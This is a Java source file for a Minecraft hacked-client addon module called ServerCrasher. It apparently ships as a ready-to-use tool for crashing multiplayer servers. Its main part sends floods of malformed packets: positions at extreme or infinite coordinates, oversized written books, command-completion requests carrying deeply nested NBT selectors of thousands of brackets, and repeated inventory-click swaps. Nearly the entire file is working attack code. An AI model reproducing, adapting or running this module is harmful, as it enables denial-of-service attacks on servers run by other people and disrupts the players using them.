package dev.abstr3act.addon.modules.Compassion;

import dev.abstr3act.addon.Compassion;
import dev.abstr3act.addon.module.CompassionModule;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import meteordevelopment.meteorclient.events.game.GameJoinedEvent;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent.Post;
import meteordevelopment.meteorclient.events.world.TickEvent.Pre;
import meteordevelopment.meteorclient.settings.BoolSetting.Builder;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.WrittenBookContentComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.RawFilteredPair;
import net.minecraft.text.Text;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class ServerCrasher extends CompassionModule {
    private static final String nbtExecutor = " @a[nbt={PAYLOAD}]";
    private static final String[] knownWorkingMessages = new String[]{
        "msg", "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg", "minecraft:teammsg", "minecraft:w", "minecraft:me"
    };
    private static int messageIndex = 0;
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
    private final Setting<Boolean> AACCrash = this.sgGeneral
        .add(((Builder) ((Builder) ((Builder) new Builder().name("AAC Crash")).description(".")).defaultValue(false)).build());
    private final Setting<Modes> crashMode = this.sgGeneral
        .add(
            ((meteordevelopment.meteorclient.settings.EnumSetting.Builder) ((meteordevelopment.meteorclient.settings.EnumSetting.Builder) ((meteordevelopment.meteorclient.settings.EnumSetting.Builder) ((meteordevelopment.meteorclient.settings.EnumSetting.Builder) new meteordevelopment.meteorclient.settings.EnumSetting.Builder()
                .name("mode"))
                .description("Which crash mode to use."))
                .defaultValue(Modes.NEW))
                .visible(this.AACCrash::get))
                .build()
        );
    private final Setting<Integer> amount = this.sgGeneral
        .add(
            ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                .name("amount"))
                .description("How many packets to send to the server."))
                .defaultValue(5000))
                .sliderRange(100, 10000)
                .visible(this.AACCrash::get))
                .build()
        );
    private final Setting<Boolean> onTick = this.sgGeneral
        .add(
            ((Builder) ((Builder) ((Builder) ((Builder) new Builder().name("on-tick")).description("Sends the packets every tick.")).defaultValue(false))
                .visible(this.AACCrash::get))
                .build()
        );
    private final Setting<Boolean> autoDisable = this.sgGeneral
        .add(
            ((Builder) ((Builder) ((Builder) ((Builder) new Builder().name("auto-disable")).description("Disables module on kick.")).defaultValue(true))
                .visible(this.AACCrash::get))
                .build()
        );
    private final Setting<Boolean> BookCrash = this.sgGeneral
        .add(((Builder) ((Builder) ((Builder) new Builder().name("Book Crash")).description(".")).defaultValue(false)).build());
    private final Setting<Mode> mode = this.sgGeneral
        .add(
            ((meteordevelopment.meteorclient.settings.EnumSetting.Builder) ((meteordevelopment.meteorclient.settings.EnumSetting.Builder) ((meteordevelopment.meteorclient.settings.EnumSetting.Builder) ((meteordevelopment.meteorclient.settings.EnumSetting.Builder) new meteordevelopment.meteorclient.settings.EnumSetting.Builder()
                .name("mode"))
                .description("Which type of packet to send."))
                .defaultValue(Mode.BookUpdate))
                .visible(this.BookCrash::get))
                .build()
        );
    private final Setting<Integer> amountB = this.sgGeneral
        .add(
            ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                .name("amount"))
                .description("How many packets to send to the server per tick."))
                .defaultValue(100))
                .min(1)
                .sliderMax(1000)
                .visible(this.BookCrash::get))
                .build()
        );
    private final Setting<Boolean> CompletionCrash = this.sgGeneral
        .add(((Builder) ((Builder) ((Builder) new Builder().name("Completion Crash")).description(".")).defaultValue(false)).build());
    private final Setting<Boolean> autoMode = this.sgGeneral
        .add(
            ((Builder) ((Builder) ((Builder) ((Builder) new Builder().name("Auto Mode")).description(".")).defaultValue(true)).visible(this.CompletionCrash::get))
                .build()
        );
    private final Setting<Integer> packets = this.sgGeneral
        .add(
            ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                .name("Packet"))
                .description("."))
                .min(1)
                .sliderRange(1, 64)
                .defaultValue(3))
                .visible(this.CompletionCrash::get))
                .build()
        );
    private final Setting<Integer> length = this.sgGeneral
        .add(
            ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) ((meteordevelopment.meteorclient.settings.IntSetting.Builder) new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                .name("Length"))
                .description("."))
                .min(1)
                .sliderRange(1, 5000)
                .defaultValue(2032))
                .visible(this.CompletionCrash::get))
                .build()
        );
    private final Setting<String> message = this.sgGeneral
        .add(
            ((meteordevelopment.meteorclient.settings.StringSetting.Builder) ((meteordevelopment.meteorclient.settings.StringSetting.Builder) ((meteordevelopment.meteorclient.settings.StringSetting.Builder) ((meteordevelopment.meteorclient.settings.StringSetting.Builder) new meteordevelopment.meteorclient.settings.StringSetting.Builder()
                .name("Length"))
                .description("."))
                .defaultValue("msg @a[nbt={PAYLOAD}]"))
                .visible(this.CompletionCrash::get))
                .build()
        );
    private final Setting<Boolean> PaperWindow = this.sgGeneral
        .add(((Builder) ((Builder) ((Builder) new Builder().name("Paper Window Crash")).description(".")).defaultValue(false)).build());
    int i;
    int j = 0;
    int slot = 5;

    public ServerCrasher() {
        super(Compassion.COMPASSION, "ServerCrasher", "Resource pack fucker");
    }

    public void onActivate() {
        if (!this.mc.isInSingleplayer()) {
            if (this.CompletionCrash.get()) {
                messageIndex = 0;
                if (this.autoMode.get()) {
                    return;
                }

                String overflow = this.generateJsonObject(this.length.get());
                String partialCommand = ((String) this.message.get()).replace("{PAYLOAD}", overflow);

                for (int i = 0; i < this.packets.get(); i++) {
                    this.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                }

                this.toggle();
            }

            if (this.AACCrash.get() && Utils.canUpdate() && !this.onTick.get()) {
                switch ((Modes) this.crashMode.get()) {
                    case NEW:
                        for (double i = 0.0; i < (this.amount.get()).intValue(); i++) {
                            this.mc
                                .getNetworkHandler()
                                .sendPacket(
                                    new PositionAndOnGround(this.mc.player.getX() + 9412.0 * i, this.mc.player.getY() + 9412.0 * i, this.mc.player.getZ() + 9412.0 * i, true)
                                );
                        }
                        break;
                    case OTHER:
                        for (double i = 0.0; i < (this.amount.get()).intValue(); i++) {
                            this.mc
                                .getNetworkHandler()
                                .sendPacket(
                                    new PositionAndOnGround(
                                        this.mc.player.getX() + 500000.0 * i, this.mc.player.getY() + 500000.0 * i, this.mc.player.getZ() + 500000.0 * i, true
                                    )
                                );
                        }
                        break;
                    case OLD:
                        this.mc.getNetworkHandler().sendPacket(new PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }

                if (this.autoDisable.get()) {
                    this.toggle();
                }
            }
        }
    }

    @EventHandler
    public void onTick(Pre tickEvent) {
        if (!this.mc.isInSingleplayer()) {
            if (this.PaperWindow.get()) {
                if (this.j <= 1) {
                    this.j++;
                } else {
                    ScreenHandler sh = this.mc.player.currentScreenHandler;
                    ClickSlotC2SPacket p = new ClickSlotC2SPacket(
                        sh.syncId,
                        sh.getRevision(),
                        36,
                        -1,
                        SlotActionType.SWAP,
                        sh.getCursorStack().copy(),
                        Int2ObjectMaps.singleton(0, new ItemStack(Items.GOLDEN_CARROT, 1))
                    );
                    this.sendPacket(p);
                    this.j = 0;
                }
            }

            if (this.AACCrash.get() && this.onTick.get()) {
                switch ((Modes) this.crashMode.get()) {
                    case NEW:
                        for (double i = 0.0; i < (this.amount.get()).intValue(); i++) {
                            this.mc
                                .getNetworkHandler()
                                .sendPacket(
                                    new PositionAndOnGround(this.mc.player.getX() + 9412.0 * i, this.mc.player.getY() + 9412.0 * i, this.mc.player.getZ() + 9412.0 * i, true)
                                );
                        }
                        break;
                    case OTHER:
                        for (double i = 0.0; i < (this.amount.get()).intValue(); i++) {
                            this.mc
                                .getNetworkHandler()
                                .sendPacket(
                                    new PositionAndOnGround(
                                        this.mc.player.getX() + 500000.0 * i, this.mc.player.getY() + 500000.0 * i, this.mc.player.getZ() + 500000.0 * i, true
                                    )
                                );
                        }
                        break;
                    case OLD:
                        for (double i = 0.0; i < (this.amount.get()).intValue(); i++) {
                            this.mc
                                .getNetworkHandler()
                                .sendPacket(new PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                        }
                }
            }
        }
    }

    @EventHandler
    private void onTickEvent(Post t) {
        if (!this.mc.isInSingleplayer()) {
            if (this.CompletionCrash.get()) {
                if (!this.autoMode.get()) {
                    return;
                }

                if (messageIndex == knownWorkingMessages.length - 1) {
                    messageIndex = 0;
                    this.toggle();
                    return;
                }

                if (this.i <= 20) {
                    this.i++;
                } else {
                    String knownMessage = knownWorkingMessages[messageIndex] + " @a[nbt={PAYLOAD}]";
                    int len = 2044 - knownMessage.length();
                    String overflow = this.generateJsonObject(len);
                    String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

                    for (int i = 0; i < this.packets.get(); i++) {
                        this.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                    }

                    this.i = 0;
                    messageIndex++;
                }
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (this.isActive()) {
            this.toggle();
        }
    }

    @EventHandler
    private void onGameJoin(GameJoinedEvent event) {
        if (this.isActive()) {
            this.toggle();
        }
    }

    @EventHandler
    private void onTick1(Pre e) {
        if (!this.mc.isInSingleplayer()) {
            if (this.BookCrash.get() && Utils.canUpdate()) {
                for (int i = 0; i < this.amountB.get(); i++) {
                    this.sendBadBook();
                }
            }
        }
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400.0;
        String mm255 = RandomStringUtils.randomAlphanumeric(255);
        switch ((Mode) this.mode.get()) {
            case BookUpdate:
                ArrayList<String> pages = new ArrayList<>();

                for (int i = 0; i < 50; i++) {
                    StringBuilder page = new StringBuilder();
                    page.append(mm255);
                    pages.add(page.toString());
                }

                this.mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(this.mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
                break;
            case Creative:
                for (int i = 0; i < 5; i++) {
                    if (this.slot > 45) {
                        this.slot = 0;
                        return;
                    }

                    this.slot++;
                    ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
                    List<RawFilteredPair<Text>> list = new ArrayList<>();

                    for (int j = 0; j < 99; j++) {
                        list.add(RawFilteredPair.of(Text.of(RandomStringUtils.randomAlphabetic(200))));
                    }

                    WrittenBookContentComponent component = (WrittenBookContentComponent) book.get(DataComponentTypes.WRITTEN_BOOK_CONTENT);
                    WrittenBookContentComponent newComponent = new WrittenBookContentComponent(
                        RawFilteredPair.of(RandomStringUtils.randomAlphabetic(9000)),
                        RandomStringUtils.randomAlphabetic(25564),
                        component.generation(),
                        list,
                        component.resolved()
                    );
                    book.set(DataComponentTypes.WRITTEN_BOOK_CONTENT, newComponent);
                    this.mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(this.slot, book));
                }
        }
    }

    private String generateJsonObject(int levels) {
        String in = IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
        return "{a:" + in + "}";
    }

    public static enum Mode {
        BookUpdate,
        Creative;
    }

    public static enum Modes {
        NEW,
        OTHER,
        OLD;
    }
}
